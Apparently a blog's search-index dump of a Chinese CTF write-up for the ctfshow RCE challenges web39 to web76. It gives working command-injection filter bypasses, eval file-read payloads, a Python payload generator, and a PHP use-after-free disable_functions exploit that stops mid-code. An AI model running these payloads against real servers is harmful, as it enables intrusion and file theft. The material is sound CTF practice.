http://d0f68156-270b-4b09-9858-96cdfcb60a6f.challenge.ctf.show/?c=data://text/palin,\u003c?=system('tac fla?.???');?\u003e// ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:7","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web39"},{"categories":["CTF","web"],"content":"\r[web40] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 06:03:36 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\\u0026|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\\u003c|\\.|\\\u003e|\\/|\\?|\\\\\\\\/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } payload1 http://c8c8e348-2afc-4708-974f-6397d6a41122.challenge.ctf.show/?c=eval(next(reset(get_defined_vars())));\u00261=;system(\"tac%20flag.php\"); get_defined_vars() 函数返回当前作用域中的所有已定义变量的数组。 reset() 函数将数组指针重置为第一个元素，并返回该元素的值。 next() 函数将指针移动到数组的下一个元素，并返回该元素的值。 eval() 函数将返回的值作为字符串进行评估，即执行该字符串作为PHP代码。 payload2 http://c8c8e348-2afc-4708-974f-6397d6a41122.challenge.ctf.show/?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv()))))); localeconv() 函数返回包含本地化设置的数组。 pos() 函数返回数组的当前元素。 scandir() 函数返回指定目录中的文件和目录列表。 array_reverse() 函数将文件和目录列表按相反的顺序重新排列。 next() 函数将指针移动到数组的下一个元素，并返回该元素的值。 highlight_file() 函数接受返回的文件路径，并以HTML格式高亮显示该文件的内容。 echo 语句将高亮显示的文件内容输出到浏览器。 ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:8","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web40"},{"categories":["CTF","web"],"content":"\r[web41]过滤了基本上所有的可见字符，但没有过滤或运算符|和双引号” 可以使用或运算构造字符 这里也是直接用了佬写的脚本 通过修改脚本中的参数直接获取flag pythonimport re import requests url=\"http://8c9b5cd2-3f92-4451-a610-c30153b6063d.challenge.ctf.show/\" a=[] ans1=\"\" ans2=\"\" for i in range(0,256): c=chr(i) tmp = re.match(r'[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026|\\-',c, re.I) if(tmp): continue #print(tmp.group(0)) else: a.append(i) # eval(\"echo($c);\"); mya=\"system\" #函数名 这里修改！ myb=\"tac flag.php\" #参数 def myfun(k,my): global ans1 global ans2 for i in range (0,len(a)): for j in range(i,len(a)): if(a[i]|a[j]==ord(my[k])): ans1+=chr(a[i]) ans2+=chr(a[j]) return; for k in range(0,len(mya)): myfun(k,mya) data1=\"(\\\"\"+ans1+\"\\\"|\\\"\"+ans2+\"\\\")\" ans1=\"\" ans2=\"\" for k in range(0,len(myb)): myfun(k,myb) data2=\"(\\\"\"+ans1+\"\\\"|\\\"\"+ans2+\"\\\")\" data={\"c\":data1+data2} r=requests.post(url=url,data=data) print(r.text) ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:9","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web41"},{"categories":["CTF","web"],"content":"\r[web42] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 20:51:55 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; system($c.\" \u003e/dev/null 2\u003e\u00261\"); }else{ highlight_file(__FILE__); } system($c.\" \u003e/dev/null 2\u003e\u00261\");: system() 函数用于执行操作系统命令。在这里，它执行了一个由变量$c组成的命令。\u003e/dev/null 是一个重定向操作符，用于将命令输出重定向到空设备（即丢弃输出）。2\u003e\u00261 是将标准错误输出重定向到与标准输出相同的位置。这样做的目的通常是隐藏命令的输出。 /dev/null 2\u003e\u00261是不进行回显，所以采用命令把flag打印出来，利用；分隔分化一下 构造payload： http://69d3026b-8d3d-465d-9e88-de78c94b2173.challenge.ctf.show/?c=tac flag.php; ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:10","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web42"},{"categories":["CTF","web"],"content":"\r[web43] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:32:51 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|cat/i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); } }else{ highlight_file(__FILE__); } 过滤的分号;和cat 过滤分号可以用||来绕过，也可以用%0a 构造payload： http://86675d5f-84b3-463e-b502-aa45872d35e5.challenge.ctf.show/?c=tac flag*%0a ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:11","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web43"},{"categories":["CTF","web"],"content":"\r[web44] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:32:01 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/;|cat|flag/i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); } }else{ highlight_file(__FILE__); } payload: http://74f7b3e3-07ef-4406-92ce-50ef4a1b36b2.challenge.ctf.show/?c=tac fla*%0a ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:12","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web44"},{"categories":["CTF","web"],"content":"\r[web45] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:35:34 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|cat|flag| /i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); } }else{ highlight_file(__FILE__); } 在之前的过滤基础上，把空格过滤了，所以可以采用“tab”但是直接按tab键会使光标跳到分隔符之后或者跳在历史记录中的下一条记录 所以采用tab的url编码%09 http://36a28485-8f30-45c2-8609-9961e849c7d9.challenge.ctf.show/?c=tac%09fla*|| ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:13","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web45"},{"categories":["CTF","web"],"content":"\r[web46] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:50:19 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*/i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); } }else{ highlight_file(__FILE__); } payload: http://fbf393b9-61e3-424c-a868-ed9427f3231e.challenge.ctf.show/?c=tac%09fla%27%27g.php|| ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:14","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web46"},{"categories":["CTF","web"],"content":"\r[web47] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:59:23 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); } }else{ highlight_file(__FILE__); } 这次又多过滤了more，less，head，sort，tail more:一页一页的显示档案内容 less:与 more 类似 head:查看头几行 tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示 tail:查看尾几行 nl：显示的时候，顺便输出行号 od:以二进制的方式读取档案内容 vi:一种编辑器，这个也可以查看 vim:一种编辑器，这个也可以查看 sort:可以查看 uniq:可以查看 file -f:报错出具体内容 grep:在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings payload： http://25de6835-dd96-4a50-83af-50fa48cfa1f4.challenge.ctf.show/?c=tac%09fla?.php|| ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:15","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web47"},{"categories":["CTF","web"],"content":"\r[web48] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:06:20 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); } }else{ highlight_file(__FILE__); } payload： http://fcd9b6a0-166f-483d-b987-2691fda042b2.challenge.ctf.show/?c=tac%09fla?.php|| [web49]跟48差不多 ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:16","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web48"},{"categories":["CTF","web"],"content":"\r[web50] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:32:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); } }else{ highlight_file(__FILE__); } payload: http://14f16d04-b94e-4a71-81d9-0b3a691de2a9.challenge.ctf.show/?c=tac\u003cfl''ag.php|| ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:17","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web50"},{"categories":["CTF","web"],"content":"\r[web51] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:42:52 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); } }else{ highlight_file(__FILE__); } 又过滤了tac等，可以使用ta‘’c payload： http://efdac68a-4d21-4a65-b7bf-cbc9f8f0f7b9.challenge.ctf.show?c=ta''c\u003cfla''g.php|| ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:18","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web51"},{"categories":["CTF","web"],"content":"\r[web52] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:50:30 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\\u003e|\\\u003c/i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); } }else{ highlight_file(__FILE__); } payload: http://a48d624c-f414-43b1-8bfa-238d060672de.challenge.ctf.show/?c=ls${IFS}/|| http://a48d624c-f414-43b1-8bfa-238d060672de.challenge.ctf.show/?c=ta''c${IFS}/fla''g|| ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:19","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web52"},{"categories":["CTF","web"],"content":"\r[web53] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 18:21:02 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\\u003e|\\\u003c/i\", $c)){ echo($c); $d = system($c); echo \"\u003cbr\u003e\".$d; }else{ echo 'no'; } }else{ highlight_file(__FILE__); } payload: http://009c1d7c-5a7a-44a5-8a5c-9fdea5fa3cac.challenge.ctf.show/?c=ta''c${IFS}fla''g.php ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:20","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web53"},{"categories":["CTF","web"],"content":"\r[web54] \u003c?php if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\\u003e|\\\u003c/i\", $c)){ system($c); } }else{ highlight_file(__FILE__); } 先改名为a.txt： http://9d8e8af5-98cb-4ac4-9589-566680643379.challenge.ctf.show/?c=mv${IFS}fl??.???${IFS}a.txt 然后直接访问 http://9d8e8af5-98cb-4ac4-9589-566680643379.challenge.ctf.show/a.txt ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:21","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web54"},{"categories":["CTF","web"],"content":"\r[web55] \u003c?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 20:03:51 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // 你们在炫技吗？ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\\u003e|\\\u003c/i\", $c)){ system($c); } }else{ highlight_file(__FILE__); } 无字母RCE 由于过滤了字母，但没有过滤数字，我们尝试使用/bin目录下的可执行程序。 ?c=/bin/base64 flag.php http://09b4ab86-9c0f-4b01-ab1b-c62620f27051.challenge.ctf.show/?c=/???/????64 ????.??? 复制出来base64解码 ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:22","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web55"},{"categories":["CTF","web"],"content":"\r[web56] \u003c?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 22:02:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // 你们在炫技吗？ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|[a-z]|[0-9]|\\\\$|\\(|\\{|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\\u003e|\\\u003c/i\", $c)){ system($c); } }else{ highlight_file(__FILE__); } 过滤了所有的字母和数字，以及一系列的符号。 本题最值得推敲的点就是无字母数字的命令执行 https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html 我们上传到Linux系统中的文件，都会被存放到/tmp目录下，并且传入生成的临时文件，只有传入的php文件中含有大写字母，且默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母，而且可以发现，只有PHP生成的临时文件包含大写字母，因此可以使用方法来选择传入的php文件/???/???[@-[] 从ascii码表可以看出，大写字母是被@和[两个字符所包围的，因此[@-[]可以用来表示所有的大写字母。 看了许多关于本题的博客，发现解题方法不外乎通过构造一个html poc： \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003ePOST数据包POC\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"http://d06e4766-59a3-43fc-af3b-6dd6f1fd84a3.challenge.ctf.show/\" method=\"post\" enctype=\"multipart/form-data\"\u003e \u003c!--链接是当前打开的题目链接--\u003e \u003clabel for=\"file\"\u003e文件名：\u003c/label\u003e \u003cinput type=\"file\" name=\"file\" id=\"file\"\u003e\u003cbr\u003e \u003cinput type=\"submit\" name=\"submit\" value=\"提交\"\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e 通过phpstudy搭建本地环境，我把它命名为test.html 然后进入http://127.0.0.1/test.html 通过该页面实现对题目的文件上传 在需要上传的php文件中写入 #!/bin/sh ls 上传的同时开启抓包拦截，修改get传参部分 ?c=.%20/???/????????[@-[] 并发送到repeater 可以直接在repeater中修改所上传的文件内容，来获取flag ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:23","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web56"},{"categories":["CTF","web"],"content":"\r[web57] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-08 01:02:56 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // 还能炫的动吗？ //flag in 36.php if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\'|\\\"|\\`|\\%|\\x09|\\x26|\\x0a|\\\u003e|\\\u003c|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i\", $c)){ system(\"cat \".$c.\".php\"); } }else{ highlight_file(__FILE__); } 题目中已经提示flag在36.php中了，根据题目可知，我们只需要绕过过滤传参36即可 python脚本： data = \"$((~$((\"+\"$((~$(())))\"*37+\"))))\" print(data) $((\"\"))值为0,$((~$((\"\"))))值为-1 注意的是：${_}会输出上一次的执行结果 payload: http://cdc732c6-8cd0-470d-9010-35488663232b.challenge.ctf.show/?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) 传参之后页面是没有回显的，按ctrl+u查看源码可得到： ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:24","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web57"},{"categories":["CTF","web"],"content":"\r[web58] \u003c?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 22:02:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // 你们在炫技吗？ if(isset($_POST['c'])){ $c= $_POST['c']; eval($c); }else{ highlight_file(__FILE__); } 直接用system()函数发现被禁了 可以用file_get_contents payload:(POST传参) c=echo file_get_contents(\"flag.php\"); (记得查看网站源码来获取flag) web59/60/61/62/63/64/65/67 要注意有些题目的flag文件在根目录，有些是在网站目录 payload： c=echo file_get_contents(\"flag.php\"); c=readfile(\"flag.php\"); c=var_dump(file('flag.php')); c=highlight_file(\"flag.php\"); c=show_source(\"flag.php\"); c=$a=fopen(\"flag.php\",\"r\");while (!feof($a)) {$line = fgets($a);echo $line;}#一行一行读取 c=$a=fopen(\"flag.php\",\"r\");while (!feof($a)) {$line = fgetc($a);echo $line;}#一行一个一个字符取 c=$a=fopen(\"flag.php\",\"r\");while (!feof($a)) {$line = fgetcsv($a);var_dump($line);} https://blog.csdn.net/m0_62207170/article/details/129902182 [web59]跟58一模一样的题 ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:25","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web58"},{"categories":["CTF","web"],"content":"\r[web66] \u003c?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 22:02:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // 你们在炫技吗？ if(isset($_POST['c'])){ $c= $_POST['c']; eval($c); }else{ highlight_file(__FILE__); } 前端显示出来的代码长得跟前面一样，但过滤了很多函数，尝试了前面的payload都行不通 先查看根目录内容 c=print_r(scandir(\"/\")); 或者可以用 c=var_dump(scandir('/')); 可以看到根目录下的flag.txt文件，随后 c=highlight_file(\"/flag.txt\"); ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:26","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web66"},{"categories":["CTF","web"],"content":"\r[web68]\r直接禁用了highlight_file函数，显示根目录文件 c=var_dump(scandir('/')); 然后直接 c=include('/flag.txt'); ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:27","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web68"},{"categories":["CTF","web"],"content":"\r[web69]尝试c=include('index.php');发现字节太大了 直接尝试include flag.txt，成功了 c=include('/flag.txt'); web70类似 ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:28","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web69"},{"categories":["CTF","web"],"content":"\r[web71] \u003c?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 22:02:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); ini_set('display_errors', 0); // 你们在炫技吗？ if(isset($_POST['c'])){ $c= $_POST['c']; eval($c); $s = ob_get_contents(); ob_end_clean(); echo preg_replace(\"/[0-9]|[a-z]/i\",\"?\",$s); }else{ highlight_file(__FILE__); } ?\u003e 你要上天吗？ 源码劫持了输出缓冲并且将数字和字母替换成了? ob_get_contents — 返回输出缓冲区的内容 ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲 题解1： 在劫持输出缓冲区之前就把缓冲区送出，可以用的函数有： ob_flush(); ob_end_flush(); payload： c=include('/flag.txt');ob_flush(); 题解2： 提前终止程序，即执行完代码直接退出，可以调用的函数有： exit(); die(); payload： c=include('/flag.txt');exit(); ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:29","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web71"},{"categories":["CTF","web"],"content":"\r[web72] \u003c?php /* # -*- coding: utf-8 -*- # @Author: Lazzaro # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 22:02:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); ini_set('display_errors', 0); // 你们在炫技吗？ if(isset($_POST['c'])){ $c= $_POST['c']; eval($c); $s = ob_get_contents(); ob_end_clean(); echo preg_replace(\"/[0-9]|[a-z]/i\",\"?\",$s); }else{ highlight_file(__FILE__); } ?\u003e 你要上天吗？ 查看源代码， 用glob协议读取根目录 c=?\u003e\u003c?php $a=new DirectoryIterator(\"glob:///*\"); foreach($a as $f) {echo($f-\u003e__toString().' '); } exit(0); ?\u003e 用uaf脚本命令执行,并url编码： c=function ctfshow($cmd) { global $abc, $helper, $backtrace; class Vuln { public $a; public function __destruct() { global $backtrace; unset($this-\u003ea); $backtrace = (new Exception)-\u003egetTrace(); if(!isset($backtrace[1]['args'])) { $backtrace = debug_backtrace(); } } } class Helper { public $a, $b, $c, $d; } function str2ptr(\u0026$str, $p = 0, $s = 8) { $address = 0; for($j = $s-1; $j \u003e= 0; $j--) { $address \u003c\u003c= 8; $address |= ord($str[$p+$j]); } return $address; } function ptr2str($ptr, $m = 8) { $out = \"\"; for ($i=0; $i \u003c $m; $i++) { $out .= sprintf(\"%c\",($ptr \u0026 0xff)); $ptr \u003e\u003e= 8; } return $out; } function write(\u0026$str, $p, $v, $n = 8) { $i = 0; for($i = 0; $i \u003c $n; $i++) { $str[$p + $i] = sprintf(\"%c\",($v \u0026 0xff)); $v \u003e\u003e= 8; } } function leak($addr, $p = 0, $s = 8) { global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-\u003ea); if($s != 8) { $leak %= 2 \u003c\u003c ($s * 8) - 1; } return $leak; } function parse_elf($base) { $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i \u003c $e_phnum; $i++) { $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 \u0026\u0026 $p_flags == 6) { $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; } else if($p_type == 1 \u0026\u0026 $p_flags == 5) { $text_size = $p_memsz; } } if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; } function get_basic_funcs($base, $elf) { list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i \u003c $data_size / 8; $i++) { $leak = leak($data_addr, $i * 8); if($leak - $base \u003e 0 \u0026\u0026 $leak - $base \u003c $data_addr - $base) { $deref = leak($leak); if($deref != 0x746e6174736e6f63) continue; } else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base \u003e 0 \u0026\u0026 $leak - $base \u003c $data_addr - $base) { $deref = leak($leak); if($deref != 0x786568326e6962) continue; } else continue; return $data_addr + $i * 8; } } function get_binary_base($binary_leak) { $base = 0; $start = $binary_leak \u0026 0xfffffffffffff000; for($i = 0; $i \u003c 0x1000; $i++) { $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) { return $addr; } } } function get_system($basic_funcs) { $addr = $basic_funcs; do { $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) { return leak($addr + 8); } $addr += 0x20; } while($f_entry != 0); return false; } function trigger_uaf($arg) { $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'); $vuln = new Vuln(); $vuln-\u003ea = $arg; } if(stristr(PHP_OS, 'WIN')) { die('This PoC is for *nix systems only.'); } $n_alloc = 10; $contiguous = []; for($i = 0; $i \u003c $n_alloc; $i++) $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'); trigger_uaf('x'); $abc = $backtrace[1]['args'][0]; $helper = new Helper; $helper-\u003eb = function ($x) { }; if(strlen($abc) == 79 || strlen($abc) == 0) { die(\"UAF failed\"); } $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; write($abc, 0x60, 2); write($abc, 0x70, 6); write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2","date":"2023-11-17","objectID":"/ctfshow_rce/:22:30","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web72"},{"categories":["CTF","web"],"content":"\r[web73]先读取目录： c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f-\u003e__toString().\" \");};exit(); 发现flagc.txt文件 发现可以直接include: c=include('/flagc.txt');exit(); web74是相同的套路 ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:31","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web73"},{"categories":["CTF","web"],"content":"\r[web75]读取目录： c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f-\u003e__toString().\" \");};exit(); 然后发现无法直接include，可以使用一些可使用的进程去读取flag。这里使用PDO(PHP Database Object)去执行sql语句进而读出flag，payload如下： c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');foreach($dbh-\u003equery('select load_file(\"/flag36.txt\")') as $row) {echo($row[0]).\"|\"; }$dbh = null;}catch (PDOException $e) {echo $e- \u003egetMessage();exit(0);}exit(0); web76是同样的套路 